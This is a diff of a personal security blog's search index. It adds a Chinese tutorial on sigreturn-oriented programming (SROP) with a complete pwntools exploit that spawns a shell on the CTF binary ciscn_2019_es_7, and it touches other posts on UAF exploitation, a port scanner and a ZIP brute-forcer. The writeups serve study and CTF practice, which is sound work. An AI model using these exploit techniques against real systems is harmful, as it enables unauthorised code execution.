@@ -3,6 +3,174 @@
   
     
     <entry>
+      <title><![CDATA[SROP技术详解]]></title>
+      <url>/2020/02/25/srop-ji-zhu-xiang-jie/</url>
+      <content type="html"><![CDATA[<html><head></head><body><h1 id="SROP简介"><a href="#SROP简介" class="headerlink" title="SROP简介"></a>SROP简介</h1><p>SROP全名是<code>Sigreturn Oriented Programming</code> 这个手法是在 2014年被Vrije Universiteit Amsterdam的Erik Bosman提出 这个手法最终利用的还是系统调用 即64位中的<code>syscall</code> 32位中的<code>int 80h</code></p>
+<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>signal机制是类unix系统中进程之间相互传递信息的一种方法 也可以称其为软中断信号 一般来说信号机制常见的步骤是<br>1.内核向某个进程发送Signal机制 该进程会暂时挂起 进入内核态<br>2.内核为了以后恢复程序会为该进程保存现场 主要是将所有的寄存器压入栈 以及signal信息 然后将程序流向指向<code>Sigreturn</code>的系统调用地址 </p>
+<p>此时栈的情况如下:<br><img src="https://i.loli.net/2020/02/25/g5RVEJQbjmDNkda.png" alt></p>
+<p>通常我们称<code>ucontext</code>和<code>siginfo</code>这一部分为<code>Signal Frame</code> 注意 以上的所有信息都是在用户进程的地址空间 这里分别给出<code>Signal Frame</code>在32位和64位中的构造  </p>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//X86</span>
+<span class="token keyword">struct</span> sigcontext
+<span class="token punctuation">{</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">,</span> __gsh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">,</span> __fsh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> es<span class="token punctuation">,</span> __esh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> ds<span class="token punctuation">,</span> __dsh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> edi<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esi<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebp<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebx<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> edx<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ecx<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eax<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> trapno<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> err<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eip<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">,</span> __csh<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eflags<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp_at_signal<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> ss<span class="token punctuation">,</span> __ssh<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> oldmask<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> cr2<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//X64</span>
+<span class="token keyword">struct</span> _fpstate
+<span class="token punctuation">{</span>
+  <span class="token comment" spellcheck="true">/* FPU environment matching the 64-bit FXSAVE layout.  */</span>
+  __uint16_t        cwd<span class="token punctuation">;</span>
+  __uint16_t        swd<span class="token punctuation">;</span>
+  __uint16_t        ftw<span class="token punctuation">;</span>
+  __uint16_t        fop<span class="token punctuation">;</span>
+  __uint64_t        rip<span class="token punctuation">;</span>
+  __uint64_t        rdp<span class="token punctuation">;</span>
+  __uint32_t        mxcsr<span class="token punctuation">;</span>
+  __uint32_t        mxcr_mask<span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> _fpxreg    _st<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> _xmmreg    _xmm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  __uint32_t        padding<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> sigcontext
+<span class="token punctuation">{</span>
+  __uint64_t r8<span class="token punctuation">;</span>
+  __uint64_t r9<span class="token punctuation">;</span>
+  __uint64_t r10<span class="token punctuation">;</span>
+  __uint64_t r11<span class="token punctuation">;</span>
+  __uint64_t r12<span class="token punctuation">;</span>
+  __uint64_t r13<span class="token punctuation">;</span>
+  __uint64_t r14<span class="token punctuation">;</span>
+  __uint64_t r15<span class="token punctuation">;</span>
+  __uint64_t rdi<span class="token punctuation">;</span>
+  __uint64_t rsi<span class="token punctuation">;</span>
+  __uint64_t rbp<span class="token punctuation">;</span>
+  __uint64_t rbx<span class="token punctuation">;</span>
+  __uint64_t rdx<span class="token punctuation">;</span>
+  __uint64_t rax<span class="token punctuation">;</span>
+  __uint64_t rcx<span class="token punctuation">;</span>
+  __uint64_t rsp<span class="token punctuation">;</span>
+  __uint64_t rip<span class="token punctuation">;</span>
+  __uint64_t eflags<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> __pad0<span class="token punctuation">;</span>
+  __uint64_t err<span class="token punctuation">;</span>
+  __uint64_t trapno<span class="token punctuation">;</span>
+  __uint64_t oldmask<span class="token punctuation">;</span>
+  __uint64_t cr2<span class="token punctuation">;</span>
+  __extension__ <span class="token keyword">union</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>
+      __uint64_t __fpstate_word<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+  __uint64_t __reserved1 <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p>3.在执行完以上操作之后 程序会跳转到注册过的<code>signal handler</code>中处理响应的<code>signal</code> 在执行完<code>signal handler</code>后 根据程序流向便会执行<code>signerturn</code> 即恢复现场操作 恢复所有寄存器 最后恢复进程的执行 其中32位的<code>sigreturn</code>的系统调用号为77 64位的系统调用号为15</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>其实从上文中<code>signal frame</code>存在用户进程的地址空间 就可以大致猜测出来攻击手法 那就是伪造一个<code>Signal Frame</code>出来<br>因为内核仅仅就是为进程保存现场和恢复现场 所有的变动都在<code>Signal Frame</code>中 也就是说 内核并不会为进程去记录<code>signal</code>对应的<code>Signal Frame</code> 所以当执行<code>sigreturn</code>系统调用的时候 并没有验证这个<code>Signal Frame</code>到底是内核为用户进程创造的还是用户伪造的 那么用户就完全有能力伪造一个<code>Signal Frame</code>出来 来控制所有的寄存器值和控制程序流向</p>
+<h2 id="相较于普通ROP的优势"><a href="#相较于普通ROP的优势" class="headerlink" title="相较于普通ROP的优势"></a>相较于普通ROP的优势</h2><p>说了上面那一堆原理 可能有些人会觉得SROP比一般的ROP深奥许多 毕竟涉及到内核和中断机制 用起来还不一定顺手 一般的ROP直接控制<code>ret</code> 便可以随意控制程序流向 但是通常来说普通ROP也需要很多条件<br>1.程序必须要有一个栈溢出漏洞<br>2.攻击者必须要有许多控制寄存器的gadget<br>3.攻击者需要在被攻击程序的进程地址空间中找到这些gadget并将其填在栈的合适位置上</p>
+<p>本身gadget就不是那么好找 再加上现在操作系统的保护机制 例如ASLR 让地址随机化 寻找到合适的gadgets地址就更难了 而且对于不同的程序 都需要有不同payload 精心构造出大量的gadgets 这也让ROP的payload复用性很差 所以SROP的出现就是为了解决以上这些问题</p>
+<p>因为其主要就是利用的<code>Signal Frame</code>可伪造这个机制 来控制各个寄存器的值而不需要去寻找大量的gadgets 同时也极大程度降低了ASLR对我们攻击的影响</p>
+<h1 id="Signal-Frame的构造"><a href="#Signal-Frame的构造" class="headerlink" title="Signal Frame的构造"></a>Signal Frame的构造</h1><p>虽然SROP相比起来原本ROP有着极大的优势 但是其最为繁琐的一点就是如何伪造<code>Signal Frame</code> 毕竟需要控制一堆寄存器的值 而没有办法直观的感受自己构造的<code>Signal Frame</code>到底是对是错 这里给出一个工具 是<code>pwntools</code>自带的<code>SigreturnFrame()</code>模块</p>
+<p>使用方法如下</p>
+<pre class=" language-python"><code class="language-python">
+<span class="token comment" spellcheck="true"># arch如果是64位系统填入amd64 32为填入i386</span>
+frame<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 例如 frame.rax=0x3b</span>
+frame<span class="token punctuation">.</span>寄存器<span class="token operator">=</span>相对应的值</code></pre>
+<p>有了这个工具 那么使用SROP便再无障碍 只要程序存在一个栈溢出便可以进行SROP而不用费心的寻找各种gadgets</p>
+<h1 id="利用SROP来GetShell"><a href="#利用SROP来GetShell" class="headerlink" title="利用SROP来GetShell"></a>利用SROP来GetShell</h1><p>这里借用的测试样例是CTF比赛中的一道题<code>ciscn_2019_es_7</code>来讲解 </p>
+<p><img src="https://i.loli.net/2020/02/25/3o46GMJrihpfAs9.png" alt></p>
+<p>主程序就这两个系统调用 函数表中没有其他的可利用函数 主要是利用函数的start_addr来泄漏出来栈的地址且控制程序重新返回主函数 再利用SROP来进行getshell 因为想要使用<code>syscall</code>来开启一个shell的话 需要保证RAX的值是59 RDI的值是<code>/bin/sh\x00</code>的地址 而ESI和RDX都需要保证为0 因为RAX和RDX像这样的通用寄存器 很难控制值 所以此时采用SROP控制所有寄存器的值来保证shell的正常开启</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
+pop_eax_0x3b<span class="token operator">=</span><span class="token number">0x00000000004004e3</span>
+pop_rdi<span class="token operator">=</span><span class="token number">0x00000000004005a3</span>
+pop_eax_0xf<span class="token operator">=</span><span class="token number">0x00000000004004da</span>
+syscall<span class="token operator">=</span><span class="token number">0x0000000000400501</span>
+start_addr<span class="token operator">=</span><span class="token number">0x4004ED</span>
+pop_rbx_rbp_r12_r13_r14_r15<span class="token operator">=</span><span class="token number">0x40059A</span>
+pop_rsi_r15<span class="token operator">=</span><span class="token number">0x00000000004005a1</span>
+
+payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
+bin_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">-</span><span class="token number">0x100</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+frameExecve <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+frameExecve<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0x3b</span>
+frameExecve<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bin_addr
+frameExecve<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
+frameExecve<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>
+frameExecve<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall
+
+payload2<span class="token operator">=</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_eax_0xf<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token operator">+</span>str<span class="token punctuation">(</span>frameExecve<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script></body></html>]]></content>
+      
+        <categories>
+            
+            <category> PWN </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[基于栈溢出的ret2syscall学习]]></title>
       <url>/2020/02/14/ji-yu-zhan-yi-chu-de-ret2syscall-xue-xi/</url>
       <content type="html"><![CDATA[<html><head></head><body><p>最近终于考完了难熬的期末考试 终于有时间整理下这半年学习的东西了 关于栈溢出系统调用的知识其实一直都是一知半解 仅限于能勉强用起来 具体的原理还是不是很了解 这里也是系统的学习一下这个栈溢出的利用手法 主要还是借鉴CTFWiki的知识进行的学习 </p>
@@ -847,12 +1015,12 @@ bck<span class="token operator">-></span>fd    <span class="token operator">=</s
     <entry>
       <title><![CDATA[端口扫描脚本]]></title>
       <url>/2020/01/18/duan-kou-sao-miao-jiao-ben/</url>
-      <content type="html"><![CDATA[<h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>Python小工具第二弹???这次脚本终于优化了传参方式..使用了<code>optparse</code>这个库进行传参 具体的端口扫描功能实现是利用<code>socket</code>库实现的 中间排bug排的快死了..</p>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>Python小工具第二弹???这次脚本终于优化了传参方式..使用了<code>optparse</code>这个库进行传参 具体的端口扫描功能实现是利用<code>socket</code>库实现的 中间排bug排的快死了..</p>
 <h2 id="端口扫描脚本-V1-0"><a href="#端口扫描脚本-V1-0" class="headerlink" title="端口扫描脚本 V1.0"></a>端口扫描脚本 V1.0</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
 <span class="token keyword">import</span> optparse
 <span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>
 
-parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">'usage %prog -H &lt;target host=""> -P &lt;target port="">'</span><span class="token punctuation">)</span>
+parser<span class="token operator">=</span>optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token string">'usage %prog -H &lt;target host> -P &lt;target port>'</span><span class="token punctuation">)</span>
 parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-H'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'tgthost'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'target host'</span><span class="token punctuation">)</span>
 parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-P'</span><span class="token punctuation">,</span>dest<span class="token operator">=</span><span class="token string">'tgtport'</span><span class="token punctuation">,</span>type<span class="token operator">=</span><span class="token string">'string'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'target host'</span><span class="token punctuation">)</span>
 
@@ -884,7 +1052,7 @@ tgtport<span class="token operator">=</span>str<span class="token punctuation">(
         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口响应:\n"</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
         con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token keyword">except</span><span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口未开放"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>target<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>target<span class="token operator">></span></code></pre>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]"</span><span class="token operator">+</span>tgtp<span class="token operator">+</span><span class="token string">"端口未开放"</span><span class="token punctuation">)</span></code></pre>
 <h2 id="ToDoList"><a href="#ToDoList" class="headerlink" title="ToDoList"></a>ToDoList</h2><ul>
 <li>多线程</li>
 </ul>
@@ -906,7 +1074,7 @@ tgtport<span class="token operator">=</span>str<span class="token punctuation">(
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -926,7 +1094,7 @@ tgtport<span class="token operator">=</span>str<span class="token punctuation">(
     <entry>
       <title><![CDATA[ZIP爆破脚本]]></title>
       <url>/2020/01/14/zip-bao-po/</url>
-      <content type="html"><![CDATA[<h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>也是最近刚放假 打算写几个常用的小工具 一个是丰富自己的实战经验 另外一个也是为了划水摸鱼吧… 所以就先写了个爆破ZIP密码的小工具 整体代码效率应该还是较低的..毕竟我也只是线性的直接写下来..多线程的话现在也是刚接触..打算如果后续有时间的话就把多线程加上..优化下脚本破解速度…还有各位大佬们就别吐槽小垃圾的传参方式了..我也知道很垃圾了…后面会学习传参方式 然后替换掉现在的..</p>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h2><p>也是最近刚放假 打算写几个常用的小工具 一个是丰富自己的实战经验 另外一个也是为了划水摸鱼吧… 所以就先写了个爆破ZIP密码的小工具 整体代码效率应该还是较低的..毕竟我也只是线性的直接写下来..多线程的话现在也是刚接触..打算如果后续有时间的话就把多线程加上..优化下脚本破解速度…还有各位大佬们就别吐槽小垃圾的传参方式了..我也知道很垃圾了…后面会学习传参方式 然后替换掉现在的..</p>
 <h2 id="ZIP爆破脚本-V1-0"><a href="#ZIP爆破脚本-V1-0" class="headerlink" title="ZIP爆破脚本 V1.0"></a>ZIP爆破脚本 V1.0</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
 <span class="token keyword">import</span> zipfile
 <span class="token keyword">import</span> sys
@@ -1019,7 +1187,7 @@ word<span class="token operator">+=</span><span class="token string">'abcdefghij
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -1039,7 +1207,7 @@ word<span class="token operator">+=</span><span class="token string">'abcdefghij
     <entry>
       <title><![CDATA[UAF漏洞生成原理及利用]]></title>
       <url>/2019/12/15/uaf/</url>
-      <content type="html"><![CDATA[<h2 id="UAF漏洞生成原因"><a href="#UAF漏洞生成原因" class="headerlink" title="UAF漏洞生成原因"></a>UAF漏洞生成原因</h2><p>UAF漏洞全称为<code>Use After Free</code> 从字面意思上都能理解是在程序<code>Free</code>掉堆上的一个数据后还能继续使用 但是这并不单纯是一个函数上的漏洞 其实UAF漏洞生成的更多因素在于编程者书写代码时的逻辑漏洞 这里我们先抛除逻辑方面的漏洞 讲解一下原理层面<code>UAF漏洞</code>是怎么造成的 以及造成的原理是什么</p>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="UAF漏洞生成原因"><a href="#UAF漏洞生成原因" class="headerlink" title="UAF漏洞生成原因"></a>UAF漏洞生成原因</h2><p>UAF漏洞全称为<code>Use After Free</code> 从字面意思上都能理解是在程序<code>Free</code>掉堆上的一个数据后还能继续使用 但是这并不单纯是一个函数上的漏洞 其实UAF漏洞生成的更多因素在于编程者书写代码时的逻辑漏洞 这里我们先抛除逻辑方面的漏洞 讲解一下原理层面<code>UAF漏洞</code>是怎么造成的 以及造成的原理是什么</p>
 <p>首先我们需要明确一点 应用程序在调用<code>free()</code>函数来释放一个内存块的时候 如果内存块的大小是小于256kb的时候 dlmalloc(一种内存分配器 相当于管理员)并不会立即就将内存块释放回内存 而是将内存块标记为空闲状态备用 这样做的主要目的有两种 其一是因为此时的内存块并不是位于堆的顶端 导致内存块并不能马上释放回内核 其二是为了以防程序下一次重新申请内存块的时候还要去内存中重新申请 这块内存会留下来备用 等到程序再次申请时 直接将此内存块分配给程序 提高程序执行速度</p>
 <p>当然 dlmalloc肯定不会允许程序内部空闲的内存块无限堆积 当程序内部空闲的内存块达到256kb时 dlmalloc会立即调用<code>munmap()</code>释放内存 即dlmalloc堆积内存块的最高上限为256kb 当程序申请256kb以上的内存块时 dlmalloc会调用<code>mmap()</code>向内核重新申请256kb的内存块 而不会使用堆积空闲的内存块</p>
 <p>从程序开发和执行的角度来讲 这样的机制其实并没有什么问题 毕竟这样的机制是可以提升程序的执行效率的 而且并没有什么明显的缺陷</p>
@@ -1063,27 +1231,27 @@ word<span class="token operator">+=</span><span class="token string">'abcdefghij
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"world"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%p,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <p>使用GCC编译时无需关闭任何保护 直接编译即可</p>
 </blockquote>
 <p>这个模块是通过两个小例子来验证UAF漏洞原理的正确性 看看是否free掉内存块后 依旧对其读写会对后续分配的内存块有影响和在小于256kb的情况下 重新分配内存 是否依旧是之前free掉的内存</p>
 <p>简单解释下程序逻辑 刚开始程序会申请一个大小为10个字符型数据的内存块 然后向其内部输入<code>hello</code> 紧接着free掉此内存块 然后立刻重新申请同样大小的内存块 同时利用之前free后遗留下来的指针对之前free掉的内存块重新写入数据 然后打印数据</p>
 <p>那么我们运行程序观察下结果</p>
-<p><img src="http://115.159.222.69/tc/e6153263dc5bf272d679e57834257a30.png" alt=""></p>
+<p><img src="http://115.159.222.69/tc/e6153263dc5bf272d679e57834257a30.png" alt></p>
 <p>不难发现 程序两次申请的内存块地址是一样的 而且使用遗留下来的指针对free掉的内存块进行写入数据 同样会影响到后续重新申请的内存块 由此可以发现 UAF漏洞原理是正确的且会对程序的正常运行造成巨大的安全隐患</p>
 <h2 id="UAF漏洞的利用"><a href="#UAF漏洞的利用" class="headerlink" title="UAF漏洞的利用"></a>UAF漏洞的利用</h2><blockquote>
 <p>这里我采用的是<code>攻防世界/PWN版块进阶区/time_formatter</code>这道题来演示漏洞的利用  </p>
 </blockquote>
 <p>拿到程序查壳查保护这些起手式我就不多赘述了 程序的逻辑和做题步骤也与漏洞无关 这里直接暴露出漏洞点和漏洞细节</p>
-<p><img src="http://115.159.222.69/tc/108db783bd6be6a1b13d2271a31275d7.png" alt=""></p>
+<p><img src="http://115.159.222.69/tc/108db783bd6be6a1b13d2271a31275d7.png" alt></p>
 <p>注意观察程序逻辑 不难发现程序在此函数内存在一个巨大的逻辑漏洞 即优先释放内存块 (为方便后续讲解 后文统称此块内存块为 内存块1) 再重新询问用户判断是否真的要退出 如果选择不退出程序继续运行 如果程序执行到该函数而选择不退出程序的话 整个程序内部调用的指针进行的读写 都是指向这块已被释放的内存空间 确定此处存在典型的UAF漏洞 </p>
 <p>继续阅读程序源码 发现在用户可正常到达的函数内 存在一个重新申请一个内存块2的操作 那么这个时候基本可以断定是从此处重新申请回原本的内存块1</p>
-<p><img src="http://115.159.222.69/tc/83b1d472b84c868266538cc3de96eec5.png" alt=""></p>
+<p><img src="http://115.159.222.69/tc/83b1d472b84c868266538cc3de96eec5.png" alt></p>
 <p><em>原本的程序函数名并不是这样 为了方便理解 我对函数名进行了重命名</em></p>
 <p>同时发现程序内部执行了<code>system</code>函数 此时的参数为内存块1的值 </p>
-<p><img src="http://115.159.222.69/tc/8c379b8be016e6439c84576fd4debf66.png" alt=""></p>
+<p><img src="http://115.159.222.69/tc/8c379b8be016e6439c84576fd4debf66.png" alt></p>
 <p>起初的想法是直接在内存块1初始化时 输入<code>'/bin/sh'</code>以达到GetShell的目的 但是发现在初始化内存块1时程序存在一个检测 不允许单引号的输入</p>
-<p><img src="http://115.159.222.69/tc/1d6330a9c6b361ed4c159f60db0e06fa.png" alt=""></p>
+<p><img src="http://115.159.222.69/tc/1d6330a9c6b361ed4c159f60db0e06fa.png" alt></p>
 <p>所以此时想要GetShell只有一个办法 即正常申请一个内存块1 然后释放掉内存块1 利用UAF漏洞的特性 申请到和内存块同地址的内存块2 然后修改内存块2的值 以达到修改内存块1值的目的(虽然已经被释放掉了 但是程序内的指针依旧指向此处) 然后调用system即可 </p>
 <p>脚本如下</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -1125,7 +1293,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -1145,7 +1313,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <entry>
       <title><![CDATA[KMP算法]]></title>
       <url>/2019/12/08/kmp-suan-fa/</url>
-      <content type="html"><![CDATA[<script>
+      <content type="html"><![CDATA[<html><head><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -1163,7 +1331,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></head><body></body></html>]]></content>
       
         
     </entry>
@@ -1171,7 +1339,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <entry>
       <title><![CDATA[基于某CTF题的格式化字符串漏洞再学习]]></title>
       <url>/2019/12/07/ji-yu-mou-ctf-ti-de-ge-shi-hua-zi-fu-chuan-lou-dong-zai-xue-xi/</url>
-      <content type="html"><![CDATA[<p>最近在做SWPUCTF 发现PWN题又出现了利用格式化字符串漏洞修改值 决定彻底总结下格式化字符串漏洞</p>
+      <content type="html"><![CDATA[<html><head></head><body><p>最近在做SWPUCTF 发现PWN题又出现了利用格式化字符串漏洞修改值 决定彻底总结下格式化字符串漏洞</p>
 <h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><blockquote>
 <p>这里给出本模块的实验案例</p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
@@ -1182,14 +1350,14 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
    <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
